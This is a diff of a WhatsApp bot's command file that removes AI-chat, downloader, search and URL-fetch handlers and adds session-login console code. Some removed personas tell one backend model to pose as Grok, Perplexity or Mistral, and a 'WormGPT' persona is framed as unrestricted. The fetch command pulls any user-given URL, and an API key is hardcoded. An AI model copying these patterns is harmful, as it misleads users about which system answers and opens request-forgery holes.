-  if (!text) return reply(`Example: ${prefix+command} Hello, how are you?`)
-  try {
-    await X.sendMessage(m.chat, { react: { text: '🪱', key: m.key } })
-    const { data } = await axios.post('https://text.pollinations.ai/openai', {
-      model: 'openai',
-      messages: [
-        { role: 'system', content: 'You are WormGPT, a creative and unrestricted AI assistant. Answer all questions helpfully.' },
-        { role: 'user', content: text }
-      ],
-      stream: false
-    }, { headers: { 'Content-Type': 'application/json' }, timeout: 30000 })
-    const result = data?.choices?.[0]?.message?.content
-    if (!result) throw new Error('Empty response')
-    reply(result)
-  } catch (e) {
-    console.error('[WORMGPT ERROR]', e.message)
-    reply('❌ wormgpt is currently unavailable. Please try again.')
-  }
-}
-break
-
-case 'birdai':{
-  if (!text) return reply(`Example: ${prefix+command} Hello, how are you?`)
-  try {
-    await X.sendMessage(m.chat, { react: { text: '🐦', key: m.key } })
-    const { data } = await axios.post('https://text.pollinations.ai/openai', {
-      model: 'openai',
-      messages: [
-        { role: 'system', content: 'You are BirdAI, a concise and accurate AI assistant. Give sharp, focused answers.' },
-        { role: 'user', content: text }
-      ],
-      stream: false
-    }, { headers: { 'Content-Type': 'application/json' }, timeout: 30000 })
-    const result = data?.choices?.[0]?.message?.content
-    if (!result) throw new Error('Empty response')
-    reply(result)
-  } catch (e) {
-    console.error('[BIRDAI ERROR]', e.message)
-    reply('❌ birdai is currently unavailable. Please try again.')
-  }
-}
-break
-
-case 'perplexity':{
-  if (!text) return reply(`Example: ${prefix+command} Hello, how are you?`)
-  try {
-    await X.sendMessage(m.chat, { react: { text: '🔮', key: m.key } })
-    const { data } = await axios.post('https://text.pollinations.ai/openai', {
-      model: 'openai',
-      messages: [
-        { role: 'system', content: 'You are Perplexity AI, a research AI. Provide well-researched answers with clear explanations.' },
-        { role: 'user', content: text }
-      ],
-      stream: false
-    }, { headers: { 'Content-Type': 'application/json' }, timeout: 30000 })
-    const result = data?.choices?.[0]?.message?.content
-    if (!result) throw new Error('Empty response')
-    reply(result)
-  } catch (e) {
-    console.error('[PERPLEXITY ERROR]', e.message)
-    reply('❌ perplexity is currently unavailable. Please try again.')
-  }
-}
-break
-
-case 'mistral':{
-  if (!text) return reply(`Example: ${prefix+command} Hello, how are you?`)
-  try {
-    await X.sendMessage(m.chat, { react: { text: '🌪️', key: m.key } })
-    const { data } = await axios.post('https://text.pollinations.ai/openai', {
-      model: 'openai',
-      messages: [
-        { role: 'system', content: 'You are Mistral AI, a powerful and efficient language model. Provide accurate, nuanced responses.' },
-        { role: 'user', content: text }
-      ],
-      stream: false
-    }, { headers: { 'Content-Type': 'application/json' }, timeout: 30000 })
-    const result = data?.choices?.[0]?.message?.content
-    if (!result) throw new Error('Empty response')
-    reply(result)
-  } catch (e) {
-    console.error('[MISTRAL ERROR]', e.message)
-    reply('❌ mistral is currently unavailable. Please try again.')
-  }
-}
-break
-
-case 'grok':{
-  if (!text) return reply(`Example: ${prefix+command} Hello, how are you?`)
-  try {
-    await X.sendMessage(m.chat, { react: { text: '🤖', key: m.key } })
-    const { data } = await axios.post('https://text.pollinations.ai/openai', {
-      model: 'openai',
-      messages: [
-        { role: 'system', content: 'You are Grok, a witty and intelligent AI assistant by xAI. Be sharp, clever and insightful.' },
-        { role: 'user', content: text }
-      ],
-      stream: false
-    }, { headers: { 'Content-Type': 'application/json' }, timeout: 30000 })
-    const result = data?.choices?.[0]?.message?.content
-    if (!result) throw new Error('Empty response')
-    reply(result)
-  } catch (e) {
-    console.error('[GROK ERROR]', e.message)
-    reply('❌ grok is currently unavailable. Please try again.')
-  }
-}
-break
-
-case 'speechwrite': {
-    await X.sendMessage(m.chat, { react: { text: '🎙️', key: m.key } })
-if (!text) return reply(`╔══════════════════════════╗\n║  🎤 *SPEECH WRITER*\n╚══════════════════════════╝\n\n  └ *Usage:* ${prefix}speechwrite [topic]\n\n  _Examples:_\n  • graduation ceremony about perseverance\n  • wedding toast for my best friend\n  • motivational speech for a sports team`)
-try {
-await reply('🎤 _Crafting your speech, please wait..._')
-let systemPrompt = 'You are an elite professional speechwriter with 20+ years of experience writing for world leaders, CEOs, and celebrities. Write compelling, eloquent, emotionally resonant speeches that feel authentic and human. Structure every speech with: a powerful opening hook, a clear body with 3 main points, emotional storytelling and vivid examples, a memorable inspiring conclusion, and natural transitions throughout. Keep the tone warm, confident, and conversational. The speech should feel like a real person wrote it.'
-let { data } = await axios.post('https://text.pollinations.ai/openai', {
-    model: 'openai',
-    messages: [
-        { role: 'system', content: systemPrompt },
-        { role: 'user', content: 'Write a complete, professional speech about: ' + text + '\n\nMake it 400-600 words, ready to deliver.' }
-    ],
-    max_tokens: 1500,
-    stream: false
-}, { headers: { 'Content-Type': 'application/json' }, timeout: 30000 })
-let speech = data?.choices?.[0]?.message?.content
-if (!speech) throw new Error('No response from API')
-reply(`╔══════════════════════════╗\n║  🎤 *YOUR SPEECH*\n╚══════════════════════════╝\n\n${speech}\n\n_Generated by TOOSII-XD ULTRA_`)
-} catch(e) { reply('❌ *Speech generation failed.*\n_' + (e.message || 'Try again shortly.') + '_') }
-} break
-
-case 'imagine':
-case 'flux': {
-    await X.sendMessage(m.chat, { react: { text: '🎨', key: m.key } })
-if (!text) return reply(`╔══════════════════════════╗\n║  🎨 *AI IMAGE GENERATOR*\n╚══════════════════════════╝\n\n  └ *Usage:* ${prefix}${command} [description]\n\n  _Examples:_\n  • a futuristic city at night\n  • lion wearing a crown, digital art\n  • sunset over the ocean, photorealistic`)
-try {
-await reply('🎨 _Generating your image, please wait..._')
-let model = command === 'flux' ? 'flux' : 'turbo'
-let seed = Math.floor(Math.random() * 999999)
-let imgUrl = `https://image.pollinations.ai/prompt/${encodeURIComponent(text)}?model=${model}&width=1024&height=1024&seed=${seed}&nologo=true&enhance=true`
-// Download the image as buffer for reliable sending
-let imgBuffer = await getBuffer(imgUrl)
-if (!imgBuffer || imgBuffer.length < 5000) throw new Error('Image generation returned empty result')
-let caption = `╔══════════════════════════╗\n║  🎨 *AI GENERATED IMAGE*\n╚══════════════════════════╝\n\n  ├ 📝 *Prompt* › ${text}\n  ├ 🤖 *Model*  › ${model.toUpperCase()}\n  └ 🎲 *Seed*   › ${seed}`
-await X.sendMessage(m.chat, { image: imgBuffer, caption }, { quoted: m })
-} catch(e) {
-// Fallback: try direct URL send
-try {
-let seed2 = Math.floor(Math.random() * 999999)
-let fallbackUrl = `https://image.pollinations.ai/prompt/${encodeURIComponent(text)}?width=1024&height=1024&seed=${seed2}&nologo=true`
-await X.sendMessage(m.chat, { image: { url: fallbackUrl }, caption: `🎨 *Generated:* ${text}` }, { quoted: m })
-} catch(e2) { reply(`❌ *Image generation failed.*\n_${e2.message || 'Try again shortly.'}_`) }
-}
-} break
-
-//━━━━━━━━━━━━━━━━━━━━━━━━//
-// Downloader Commands
-case 'video':
-case 'ytv': {
-    await X.sendMessage(m.chat, { react: { text: '📺', key: m.key } })
-if (!text) return reply(`Example: ${prefix}${command} [youtube url or search query]`)
-try {
-let url = text
-let title = text
-if (!text.match(/youtu/gi)) {
-let search = await yts(text)
-if (!search.all.length) return reply('No results found.')
-url = search.all[0].url
-title = search.all[0].title
-}
-let downloaded = false
-let videoBuffer = null
-try {
-let initRes = await fetch(`https://loader.to/ajax/download.php?format=mp4&url=${encodeURIComponent(url)}`)
-let initData = await initRes.json()
-if (initData.success && initData.id) {
-    let attempts = 0
-    while (attempts < 40) {
-        await new Promise(r => setTimeout(r, 3000))
-        let progRes = await fetch(`https://loader.to/ajax/progress.php?id=${initData.id}`)
-        let progData = await progRes.json()
-        if (progData.success === 1 && progData.progress >= 1000 && progData.download_url) {
-            videoBuffer = await getBuffer(progData.download_url)
-            if (videoBuffer && videoBuffer.length > 10000) downloaded = true
-            break
-        }
-        if (progData.progress < 0) break
-        attempts++
-    }
-}
-} catch (e1) { console.log('loader.to video failed:', e1.message) }
-if (!downloaded) {
-    try {
-        let ytdl = require('@distube/ytdl-core')
-        let info = await ytdl.getInfo(url)
-        title = info.videoDetails.title
-        let format = ytdl.chooseFormat(info.formats, { quality: 'highest', filter: 'videoandaudio' })
-        if (format) {
-            let chunks = []
-            await new Promise((resolve, reject) => {
-                let stream = ytdl(url, { format })
-                stream.on('data', c => chunks.push(c))
-                stream.on('end', resolve)
-                stream.on('error', reject)
-                setTimeout(() => { stream.destroy(); reject(new Error('timeout')) }, 180000)
-            })
-            videoBuffer = Buffer.concat(chunks)
-            if (videoBuffer.length > 10000) downloaded = true
-        }
-    } catch (e2) { console.log('ytdl-core video failed:', e2.message) }
-}
-if (downloaded && videoBuffer) {
-    await X.sendMessage(m.chat, { video: videoBuffer, caption: `*${title}*\n\n${global.packname}`, mimetype: 'video/mp4' }, { quoted: m })
-} else {
-    reply('⚠️ Video download failed. Please try again later.')
-}
-} catch(e) { reply('Error: ' + e.message) }
-} break
-
-case 'ytdocplay': {
-    await X.sendMessage(m.chat, { react: { text: '🎵', key: m.key } })
-if (!text) return reply(`Example: ${prefix}ytdocplay [search query]`)
-try {
-let search = await yts(text)
-if (!search.all.length) return reply('No results found.')
-let vid = search.all.find(v => v.type === 'video') || search.all[0]
-let downloaded = false
-let audioBuffer = null
-try {
-let initRes = await fetch(`https://loader.to/ajax/download.php?format=mp3&url=${encodeURIComponent(vid.url)}`)
-let initData = await initRes.json()
-if (initData.success && initData.id) {
-    let attempts = 0
-    while (attempts < 30) {
-        await new Promise(r => setTimeout(r, 3000))
-        let progRes = await fetch(`https://loader.to/ajax/progress.php?id=${initData.id}`)
-        let progData = await progRes.json()
-        if (progData.success === 1 && progData.progress >= 1000 && progData.download_url) {
-            audioBuffer = await getBuffer(progData.download_url)
-            if (audioBuffer && audioBuffer.length > 10000) downloaded = true
-            break
-        }
-        if (progData.progress < 0) break
-        attempts++
-    }
-}
-} catch (e1) { console.log('loader.to ytdocplay failed:', e1.message) }
-if (!downloaded) {
-    try {
-        let ytdl = require('@distube/ytdl-core')
-        let info = await ytdl.getInfo(vid.url)
-        let format = ytdl.chooseFormat(info.formats, { quality: 'highestaudio', filter: 'audioonly' })
-        if (!format) format = ytdl.chooseFormat(info.formats, { filter: f => f.hasAudio })
-        if (format) {
-            let chunks = []
-            await new Promise((resolve, reject) => {
-                let stream = ytdl(vid.url, { format })
-                stream.on('data', c => chunks.push(c))
-                stream.on('end', resolve)
-                stream.on('error', reject)
-                setTimeout(() => { stream.destroy(); reject(new Error('timeout')) }, 120000)
-            })
-            audioBuffer = Buffer.concat(chunks)
-            if (audioBuffer.length > 10000) downloaded = true
-        }
-    } catch (e2) { console.log('ytdl-core ytdocplay failed:', e2.message) }
-}
-if (downloaded && audioBuffer) {
-    let cleanName = `${vid.author?.name || 'Unknown'} - ${vid.title}.mp3`.replace(/[<>:"/\\|?*]/g, '')
-    await X.sendMessage(m.chat, { document: audioBuffer, mimetype: 'audio/mpeg', fileName: cleanName }, { quoted: m })
-} else {
-    reply('⚠️ Audio download failed. Please try again later.')
-}
-} catch(e) { reply('Error: ' + e.message) }
-} break
-
-case 'ytdocvideo': {
-    await X.sendMessage(m.chat, { react: { text: '📺', key: m.key } })
-if (!text) return reply(`Example: ${prefix}ytdocvideo [search query]`)
-try {
-let search = await yts(text)
-if (!search.all.length) return reply('No results found.')
-let vid = search.all.find(v => v.type === 'video') || search.all[0]
-let downloaded = false
-let videoBuffer = null
-try {
-let initRes = await fetch(`https://loader.to/ajax/download.php?format=mp4&url=${encodeURIComponent(vid.url)}`)
-let initData = await initRes.json()
-if (initData.success && initData.id) {
-    let attempts = 0
-    while (attempts < 40) {
-        await new Promise(r => setTimeout(r, 3000))
-        let progRes = await fetch(`https://loader.to/ajax/progress.php?id=${initData.id}`)
-        let progData = await progRes.json()
-        if (progData.success === 1 && progData.progress >= 1000 && progData.download_url) {
-            videoBuffer = await getBuffer(progData.download_url)
-            if (videoBuffer && videoBuffer.length > 10000) downloaded = true
-            break
-        }
-        if (progData.progress < 0) break
-        attempts++
-    }
-}
-} catch (e1) { console.log('loader.to ytdocvideo failed:', e1.message) }
-if (!downloaded) {
-    try {
-        let ytdl = require('@distube/ytdl-core')
-        let info = await ytdl.getInfo(vid.url)
-        let format = ytdl.chooseFormat(info.formats, { quality: 'highest', filter: 'videoandaudio' })
-        if (format) {
-            let chunks = []
-            await new Promise((resolve, reject) => {
-                let stream = ytdl(vid.url, { format })
-                stream.on('data', c => chunks.push(c))
-                stream.on('end', resolve)
-                stream.on('error', reject)
-                setTimeout(() => { stream.destroy(); reject(new Error('timeout')) }, 180000)
-            })
-            videoBuffer = Buffer.concat(chunks)
-            if (videoBuffer.length > 10000) downloaded = true
-        }
-    } catch (e2) { console.log('ytdl-core ytdocvideo failed:', e2.message) }
-}
-if (downloaded && videoBuffer) {
-    let cleanName = `${vid.title}.mp4`.replace(/[<>:"/\\|?*]/g, '')
-    await X.sendMessage(m.chat, { document: videoBuffer, mimetype: 'video/mp4', fileName: cleanName }, { quoted: m })
-} else {
-    reply('⚠️ Video download failed. Please try again later.')
-}
-} catch(e) { reply('Error: ' + e.message) }
-} break
-
-case 'spotify': {
-    await X.sendMessage(m.chat, { react: { text: '🎵', key: m.key } })
-if (!text) return reply(`Example: ${prefix}spotify [song name]`)
-try {
-let search = await yts(text)
-if (!search.all.length) return reply('No results found.')
-let results = search.all.filter(v => v.type === 'video').slice(0, 5)
-if (!results.length) return reply('No results found.')
-let songInfo = `🎵 *Spotify Search: ${text}*\n\n`
-results.forEach((v, i) => {
-    songInfo += `*${i+1}.* ${v.title}\n`
-    songInfo += `   Artist: ${v.author?.name || 'Unknown'}\n`
-    songInfo += `   Duration: ${v.timestamp}\n\n`
-})
-songInfo += `_Use ${prefix}play [song name] to download as MP3_`
-reply(songInfo)
-} catch(e) { reply('Error: ' + e.message) }
-} break
-
-case 'apk': {
-    await X.sendMessage(m.chat, { react: { text: '📲', key: m.key } })
-if (!text) return reply(`Example: ${prefix}apk WhatsApp`)
-try {
-let res = await fetch(`https://api.maizapk.my.id/search?q=${encodeURIComponent(text)}`)
-if (!res.ok) {
-reply(`*APK Search:*\nSearch for "${text}" on https://apkpure.com/search?q=${encodeURIComponent(text)}`)
-} else {
-let data = await res.json()
-if (data.results && data.results.length) {
-let list = data.results.slice(0, 5).map((a, i) => `${i+1}. *${a.name}*\n${a.link || ''}`).join('\n\n')
-reply(`╔══════════════════════════╗\n║  📦 *APK SEARCH*\n╚══════════════════════════╝\n\n${list}`)
-} else reply(`No APK found for "${text}".`)
-}
-} catch { reply(`*APK Search:*\nSearch for "${text}" on https://apkpure.com/search?q=${encodeURIComponent(text)}`) }
-} break
-
-case 'gitclone': {
-    await X.sendMessage(m.chat, { react: { text: '📦', key: m.key } })
-if (!text) return reply(`Example: ${prefix}gitclone https://github.com/user/repo`)
-try {
-let repoUrl = text.replace(/\.git$/, '')
-let match = repoUrl.match(/github\.com\/([^\/]+)\/([^\/]+)/)
-if (!match) return reply('Invalid GitHub URL.')
-let [, user, repo] = match
-let zipUrl = `https://api.github.com/repos/${user}/${repo}/zipball`
-await X.sendMessage(m.chat, { document: { url: zipUrl }, mimetype: 'application/zip', fileName: `${repo}.zip` }, { quoted: m })
-} catch(e) { reply('Error: ' + e.message) }
-} break
-
-//━━━━━━━━━━━━━━━━━━━━━━━━//
-// Search & Tools Commands
-case 'yts':
-case 'ytsearch': {
-    await X.sendMessage(m.chat, { react: { text: '🔍', key: m.key } })
-if (!text) return reply(`Example: ${prefix}${command} [query]`)
-try {
-let yts = require('yt-search')
-let search = await yts(text)
-if (!search.all.length) return reply('No results found.')
-let results = search.all.slice(0, 10).map((v, i) => `${i+1}. *${v.title}*\nChannel: ${v.author?.name || 'Unknown'}\nDuration: ${v.timestamp || 'N/A'}\nViews: ${v.views?.toLocaleString() || 'N/A'}\nURL: ${v.url}`).join('\n\n')
-reply(`╔══════════════════════════╗\n║  🎬 *YOUTUBE SEARCH*\n╚══════════════════════════╝\n\n  🔍 *${text}*\n\n${results}`)
-} catch(e) { reply('Error: ' + e.message) }
-} break
-
-case 'img':
-case 'image': {
-    await X.sendMessage(m.chat, { react: { text: '🖼️', key: m.key } })
-if (!text) return reply(`Example: ${prefix}${command} cats`)
-try {
-let imgUrl = `https://image.pollinations.ai/prompt/${encodeURIComponent(text)}?width=512&height=512&nologo=true`
-await X.sendMessage(m.chat, { image: { url: imgUrl }, caption: `*Image:* ${text}` }, { quoted: m })
-} catch(e) { reply('Error: ' + e.message) }
-} break
-
-case 'movie':
-case 'film':
-case 'series': {
-    await X.sendMessage(m.chat, { react: { text: '🎬', key: m.key } })
-    if (!text) return reply(`╔══════════════════════════╗\n║  🎬 *MOVIE SEARCH*\n╚══════════════════════════╝\n\n  Search any movie or TV series.\n\n  ├ ${prefix}movie Inception\n  ├ ${prefix}movie Breaking Bad\n  └ ${prefix}movie Avengers 2019`)
-    try {
-        await reply(`🎬 _Searching for_ *${text}*_..._`)
-
-        // ── Step 1: Search OMDB (title + optional year) ──────────────
-        const _movieQ = text.trim()
-        const _yearMatch = _movieQ.match(/(19|20)\d{2}/)
-        const _year = _yearMatch ? _yearMatch[0] : ''
-        const _title = _movieQ.replace(_year, '').trim()
-
-        let _omdbUrl = `https://www.omdbapi.com/?t=${encodeURIComponent(_title)}&apikey=742b79da&plot=full`
-        if (_year) _omdbUrl += `&y=${_year}`
-
-        let _res = await fetch(_omdbUrl)
-        let _data = await _res.json()
-
-        // Try search if exact title fails
-        if (_data.Response === 'False') {
-            let _searchUrl = `https://www.omdbapi.com/?s=${encodeURIComponent(_title)}&apikey=742b79da`
-            if (_year) _searchUrl += `&y=${_year}`
-            let _searchRes = await fetch(_searchUrl)
-            let _searchData = await _searchRes.json()
-            if (_searchData.Response === 'True' && _searchData.Search?.length) {
-                // Get full details of first result
-                let _firstId = _searchData.Search[0].imdbID
-                let _detailRes = await fetch(`https://www.omdbapi.com/?i=${_firstId}&apikey=742b79da&plot=full`)
-                _data = await _detailRes.json()
+                credsData = JSON.parse(rawId)
+                console.log(`[ ${_bn} ] Decoded as raw JSON session`)
+            } catch {
+                console.log(`[ ${_bn} ] Invalid Session ID format. Must be base64 encoded or JSON.`)
+                return
             }
         }
+        const sessionPhone = credsData.me?.id?.split(':')[0]?.split('@')[0] || 'imported_' + Date.now()
+        const sessionDir = path.join(SESSIONS_DIR, sessionPhone)
+        if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir, { recursive: true })
+        fs.writeFileSync(path.join(sessionDir, 'creds.json'), JSON.stringify(credsData, null, 2))
+        console.log(`[ ${_bn} ] Session ID saved for ${sessionPhone}`)
+        console.log(`[ ${_bn} ] Connecting...`)
+        await connectSession(sessionPhone)
+    } catch (err) {
+        console.log(`[ ${_bn} ] Error processing Session ID: ${err.message || err}`)
+    }
+}
 
-        if (!_data || _data.Response === 'False') {
-            return reply(`╔══════════════════════════╗\n║  🎬 *MOVIE SEARCH*\n╚══════════════════════════╝\n\n  ❌ *Not found:* _${text}_\n\n  _Try a different spelling or add the year._\n  _Example:_ ${prefix}movie Inception 2010`)
-        }
+const rl = readline.createInterface({
+    input: process.stdin.isTTY ? process.stdin : process.stdin,
+    output: process.stdout,
+    terminal: false
+})
+// On non-TTY (Pterodactyl/headless), prevent readline from blocking
+if (!process.stdin.isTTY) {
+    try { process.stdin.resume(); process.stdin.pause() } catch {}
+}
 
-        // ── Step 2: Build ratings string ─────────────────────────────
-        let _ratings = ''
-        if (_data.Ratings && _data.Ratings.length) {
-            _ratings = _data.Ratings.map(r => {
-                if (r.Source === 'Internet Movie Database') return `⭐ *IMDb* › ${r.Value}`
-                if (r.Source === 'Rotten Tomatoes')        return `🍅 *Rotten Tomatoes* › ${r.Value}`
-                if (r.Source === 'Metacritic')             return `🎯 *Metacritic* › ${r.Value}`
-                return `› ${r.Source}: ${r.Value}`
-            }).map(l => `  ├ ${l}`).join('\n')
-        } else if (_data.imdbRating && _data.imdbRating !== 'N/A') {
-            _ratings = `  ├ ⭐ *IMDb* › ${_data.imdbRating}/10 (${_data.imdbVotes || '?'} votes)`
-        }
-
-        // ── Step 3: Build caption ─────────────────────────────────────
-        const _na = (v) => (v && v !== 'N/A') ? v : '—'
-        const _type = (_data.Type || 'movie').charAt(0).toUpperCase() + (_data.Type || 'movie').slice(1)
-        const _typeIcon = _data.Type === 'series' ? '📺' : _data.Type === 'episode' ? '🎞️' : '🎬'
-
-        let _caption = `╔══════════════════════════╗\n║  ${_typeIcon} *${_type.toUpperCase()} INFO*\n╚══════════════════════════╝\n\n`
-        _caption += `  *${_na(_data.Title)}* (${_na(_data.Year)})\n\n`
-        _caption += `  ├ 🎭 *Genre*    › ${_na(_data.Genre)}\n`
-        _caption += `  ├ ⏱️  *Runtime*  › ${_na(_data.Runtime)}\n`
-        _caption += `  ├ 🌍 *Language* › ${_na(_data.Language)}\n`
-        _caption += `  ├ 🏳️  *Country*  › ${_na(_data.Country)}\n`
-        _caption += `  ├ 📅 *Released* › ${_na(_data.Released)}\n`
-        if (_data.Type === 'series') {
-            _caption += `  ├ 📺 *Seasons*  › ${_na(_data.totalSeasons)}\n`
-        }
-        _caption += `  ├ 🎬 *Director* › ${_na(_data.Director)}\n`
-        _caption += `  ├ ✍️  *Writer*   › ${_na(_data.Writer)}\n`
-        _caption += `  ├ 🎭 *Cast*     › ${_na(_data.Actors)}\n`
-        if (_ratings) _caption += `\n  *Ratings:*\n${_ratings}\n`
-        if (_data.Awards && _data.Awards !== 'N/A') {
-            _caption += `\n  ├ 🏆 *Awards*   › ${_data.Awards}\n`
-        }
-        _caption += `\n  *📝 Plot:*\n  _${_na(_data.Plot)}_\n`
-        if (_data.imdbID) {
-            _caption += `\n  └ 🔗 *IMDb* › https://www.imdb.com/title/${_data.imdbID}`
-        }
-
-        // ── Step 4: Send with poster if available ─────────────────────
-        if (_data.Poster && _data.Poster !== 'N/A') {
-            await X.sendMessage(m.chat, {
-                image: { url: _data.Poster },
-                caption: _caption
-            }, { quoted: m })
+function waitForConsoleInput() {
+    rl.once('line', async (input) => {
+        const cmd = input.trim()
+        if (cmd === '1') {
+            console.log('')
+            console.log(`${c.green}[ ${_bn} ]${c.r} ${c.white}Enter your WhatsApp number with country code${c.r}`)
+            console.log(`${c.green}[ ${_bn} ]${c.r} ${c.dim}Example: ${c.cyan}254748340864${c.r} ${c.dim}(Kenya), ${c.cyan}2348012345678${c.r} ${c.dim}(Nigeria), ${c.cyan}12025551234${c.r} ${c.dim}(US)${c.r}`)
+            console.log(`${c.green}[ ${_bn} ]${c.r} ${c.red}Do NOT include + or leading 0${c.r}`)
+            console.log('')
+            rl.once('line', async (phoneInput) => {
+                const phone = phoneInput.trim().replace(/[^0-9]/g, '')
+                if (phone.length < 10 || phone.length > 15) {
+                    console.log(`${c.red}[ ${_bn} ] ✗ Invalid number. Must be 10-15 digits with country code.${c.r}`)
+                    waitForConsoleInput()
+                    return
+                }
+                if (phone.startsWith('0')) {
+                    console.log(`${c.red}[ ${_bn} ] ✗ Do not start with 0. Use country code instead.${c.r}`)
+                    waitForConsoleInput()
+                    return
+                }
+                console.log(`${c.green}[ ${_bn} ]${c.r} ${c.cyan}Connecting with number: ${c.bold}${phone}${c.r}${c.cyan}...${c.r}`)
+                await connectSession(phone)
+                waitForConsoleInput()
+            })
+        } else if (cmd === '2') {
+            console.log('')
+            console.log(`${c.yellow}[ ${_bn} ]${c.r} ${c.white}Paste your Session ID below:${c.r}`)
+            console.log('')
+            rl.once('line', async (sessionInput) => {
+                await handleSessionLogin(sessionInput.trim())
+                waitForConsoleInput()
+            })
+        } else if (cmd === '3') {
+            console.log(`${c.green}[ ${_bn} ]${c.r} ${c.dim}Skipped. Bot is running with existing sessions.${c.r}`)
+            waitForConsoleInput()
+        } else if (cmd.length >= 10 && /^[0-9]+$/.test(cmd)) {
+            console.log(`${c.green}[ ${_bn} ]${c.r} Detected phone number: ${c.cyan}${c.bold}${cmd}${c.r}`)
+            console.log(`${c.green}[ ${_bn} ]${c.r} ${c.cyan}Connecting...${c.r}`)
+            await connectSession(cmd)
+            waitForConsoleInput()
+        } else if (cmd) {
+            console.log(`${c.red}[ ${_bn} ] ✗ Unknown command: "${cmd}"${c.r}`)
+            console.log(`${c.yellow}[ ${_bn} ]${c.r} Type ${c.green}${c.bold}1${c.r} for Pairing Code, ${c.yellow}${c.bold}2${c.r} for Session ID`)
+            waitForConsoleInput()
         } else {
-            reply(_caption)
+            waitForConsoleInput()
         }
-
-    } catch(e) {
-        reply(`❌ *Movie search failed.*\n_${e.message || 'Please try again.'}_`)
-    }
-} break
-
-case 'shazam': {
-    await X.sendMessage(m.chat, { react: { text: '🎵', key: m.key } })
-if (!m.quoted || !/audio|video/.test(m.quoted.mimetype || '')) return reply(`╔══════════════════════════╗\n║  🎵 *SHAZAM — SONG FINDER*\n╚══════════════════════════╝\n\n  └ Reply to an audio/video with *${prefix}shazam*\n  _Works with voice notes, music & video clips._`)
-try {
-await reply('🎵 _Listening and identifying the song, please wait..._')
-// Download the media buffer
-let mediaBuf = await m.quoted.download()
-if (!mediaBuf || mediaBuf.length < 100) throw new Error('Failed to download media')
-// Save to a temp file
-let tmpFile = `/tmp/shazam_${Date.now()}.mp3`
-fs.writeFileSync(tmpFile, mediaBuf)
-// Upload to CatBox to get a public URL
-let audioUrl = await CatBox(tmpFile)
-fs.unlinkSync(tmpFile)
-if (!audioUrl || !audioUrl.startsWith('http')) throw new Error('Failed to upload audio for recognition')
-// Send to AudD music recognition API (free, no key required)
-let auddForm = new FormData()
-auddForm.append('url', audioUrl)
-auddForm.append('return', 'apple_music,spotify')
-let auddRes = await axios.post('https://api.audd.io/', auddForm, {
-    headers: { ...auddForm.getHeaders() },
-    timeout: 25000
-})
-let auddData = auddRes.data
-// If AudD returns no result, try again with the raw URL directly
-if (!auddData?.result && audioUrl) {
-    let retry = await axios.get(`https://api.audd.io/?url=${encodeURIComponent(audioUrl)}&return=apple_music,spotify`, { timeout: 20000 })
-    auddData = retry.data
-}
-if (!auddData?.result) {
-    // Fallback: try ACRCloud-compatible free endpoint
-    let fallbackForm = new FormData()
-    fallbackForm.append('url', audioUrl)
-    let fallbackRes = await axios.post('https://api.audd.io/findLyrics/', fallbackForm, {
-        headers: { ...fallbackForm.getHeaders() },
-        timeout: 20000
     })
-    if (fallbackRes.data?.status === 'success' && fallbackRes.data?.result?.length) {
-        let topLyric = fallbackRes.data.result[0]
-        return reply(`╔══════════════════════════╗\n║  🎵 *SONG FOUND*\n╚══════════════════════════╝\n\n  ├ 🎤 *Title*  › ${topLyric.title || 'Unknown'}\n  └ 👤 *Artist* › ${topLyric.artist || 'Unknown'}\n\n  _Lyrics match (fingerprint unavailable)._`)
-    }
-    return reply(`╔══════════════════════════╗\n║  🎵 *SHAZAM*\n╚══════════════════════════╝\n\n  ❌ Song not recognized.\n\n  ├ Use a longer clip (10–30 seconds)\n  ├ Ensure clear audio, minimal noise\n  └ Try the chorus or main melody`)
-}
-let r = auddData.result
-// Build response
-let lines = []
-lines.push(`╔══════════════════════════╗`)
-lines.push(`┃  🎵 *SONG IDENTIFIED!*`)
-lines.push(`┗━━━━━━━━━━━━━━━━━━━━━━━┛`)
-lines.push(``)
-lines.push(`🎤 *Title:*   ${r.title || 'Unknown'}`)
-lines.push(`👤 *Artist:*  ${r.artist || 'Unknown'}`)
-if (r.album) lines.push(`💿 *Album:*   ${r.album}`)
-if (r.release_date) lines.push(`📅 *Released:* ${r.release_date}`)
-if (r.label) lines.push(`🏷️ *Label:*   ${r.label}`)
-lines.push(``)
-// Apple Music link
-if (r.apple_music?.url) {
-    lines.push(`🍎 *Apple Music:*`)
-    lines.push(`${r.apple_music.url}`)
-    lines.push(``)
-}
-// Spotify link
-if (r.spotify?.external_urls?.spotify) {
-    lines.push(`🟢 *Spotify:*`)
-    lines.push(`${r.spotify.external_urls.spotify}`)
-    lines.push(``)
-}
-// Song preview if available
-if (r.apple_music?.previews?.[0]?.url) {
-    lines.push(`🔊 *Preview available*`)
-    lines.push(``)
-}
-lines.push(`━━━━━━━━━━━━━━━━━━━━━━━`)
-lines.push(`_Powered by TOOSII-XD ULTRA_`)
-let replyText = lines.join('\n')
-await reply(replyText)
-// Send audio preview if Apple Music preview is available
-if (r.apple_music?.previews?.[0]?.url) {
-    try {
-        let previewBuf = await getBuffer(r.apple_music.previews[0].url)
-        if (previewBuf && previewBuf.length > 1000) {
-            await X.sendMessage(m.chat, {
-                audio: previewBuf,
-                mimetype: 'audio/mp4',
-                ptt: false
-            }, { quoted: m })
-        }
-    } catch(pe) { /* Preview send failed silently */ }
-}
-} catch(e) {
-console.log('[Shazam] Error:', e.message || e)
-reply(`❌ *Shazam failed.*\n_${e.message || 'Unable to identify the song. Try again with a clearer or longer audio clip.'}_`)
-}
-} break
-
-case 'fetch':
-case 'get': {
-    await X.sendMessage(m.chat, { react: { text: '📥', key: m.key } })
-if (!text) return reply(`Example: ${prefix}fetch https://example.com/api`)
-try {
-let res = await fetch(text)
-let contentType = res.headers.get('content-type') || ''
-if (contentType.includes('json')) {
-let data = await res.json()
-reply(JSON.stringify(data, null, 2).slice(0, 4000))
-} else if (contentType.includes('image')) {
-let buffer = Buffer.from(await res.arrayBuffer())
-await X.sendMessage(m.chat, { image: buffer }, { quoted: m })
-} else if (contentType.includes('video')) {
-let buffer = Buffer.from(await res.arrayBuffer())
-await X.sendMessage(m.chat, { video: buffer }, { quoted: m })
-} else if (contentType.includes('audio')) {
-let buffer = Buffer.from(await res.arrayBuffer())
-await X.sendMessage(m.chat, { audio: buffer, mimetype: 'audio/mpeg' }, { quoted: m })
-} else {
-let txt = await res.text()
-reply(txt.slice(0, 4000))
-}
-} catch(e) { reply('Error: ' + e.message) }
-} break
-
-case 'ssweb':
-case 'ss': {
